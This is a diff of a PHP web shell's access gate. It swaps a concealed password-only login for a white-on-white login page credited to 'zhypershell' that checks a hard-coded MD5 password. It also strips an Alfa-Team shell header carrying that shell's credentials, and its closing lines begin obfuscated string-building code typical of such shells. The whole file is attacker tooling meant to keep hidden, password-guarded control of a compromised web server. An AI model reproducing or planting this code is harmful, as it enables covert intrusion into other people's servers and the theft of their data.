@@ -1,96 +1,123 @@
 <?php
 session_start();
-
-// Simpan password dalam format hash agar lebih aman
-define("PASSWORD_HASH", password_hash("download", PASSWORD_DEFAULT));
+$password = "fd456406745d816a45cae554c788e754";
 
 function login_shell()
 {
 ?>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html>
+    <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Login</title>
+    <title>I Am Atomic</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
             background: #fff;
+            background-size: cover;
             font-family: Arial, sans-serif;
+            overflow: hidden;
         }
-        .hidden-login {
-            position: absolute;
-            bottom: 5px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: transparent;
+
+        .login-container {
+            background: rgb(255, 255, 255); /* Transparansi latar belakang form */
+            padding: 20px;
+            border-radius: 8px;
+            color: #fff;
+            box-shadow: 0 4px 8px rgb(255, 255, 255);
+            margin-top: 720px;
         }
-        input[type="password"] {
-            border: none;
+
+        .login-container input[type="password"] {
+            padding: 10px;
+            margin-right: 10px;
+            border: 1px solid #ffffff;
+            border-radius: 4px;
             background: transparent;
-            color: black;
-            font-size: 16px;
-            width: 100px;
+            color: #000000;
             outline: none;
-            caret-color: black;
+        }
+
+        .login-container input[type="password"]::placeholder {
+            color: #ffffff;
+        }
+
+        .login-container input[type="submit"] {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            background: #ffffff;
+            color: #ffffff;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background: #ffffff;
+        }
+
+        .marquee-container {
+            position: fixed;
+            bottom: 0;
+            left: 500px;
+            right: 500px;
+            height: 50px;
+            overflow: hidden;
+            background: rgb(255, 255, 255);
+            display: flex;
+            align-items: center;
+            color: #fff;
+        }
+
+        .marquee {
+            white-space: nowrap;
+            display: inline-block;
+            padding-left: 75%;
+            animation: marquee 10s linear infinite;
+        }
+
+        @keyframes marquee {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(-100%);
+            }
         }
     </style>
 </head>
 <body>
-
-<form class="hidden-login" action="" method="POST">
-    <input type="password" name="password" id="password" autocomplete="off">
-</form>
-
-<script>
-    document.getElementById("password").addEventListener("input", function() {
-        if (this.value.length >= 8) { // Minimal 8 karakter sebelum submit
-            this.form.submit();
-        }
-    });
-</script>
-
+    <div class="marquee-container">
+        <div class="marquee">
+            copyright Â© zhypershell
+        </div>
+    </div>
+    <div class="login-container">
+        <form action="" method="post">
+            <div align="center">
+                <input type="password" name="pass" placeholder="Password" required>
+                <input type="submit" name="submit" value="Login">
+            </div>
+        </form>
+    </div>
 </body>
 </html>
-
 <?php
     exit;
 }
-
-// Cek jika belum login
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (!empty($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH)) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
         header("refresh: 0;");
     } else {
         login_shell();
     }
 }
-
-?>
-
-<?php
-/*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
-*/
-$GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'alfa',
-    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
-    'safe_mode' => '0',
-    'login_page' => '403',
-    'show_icons' => '1',
-    'post_encryption' => false,
-    'cgi_api' => true,
-);
 
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
 $aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
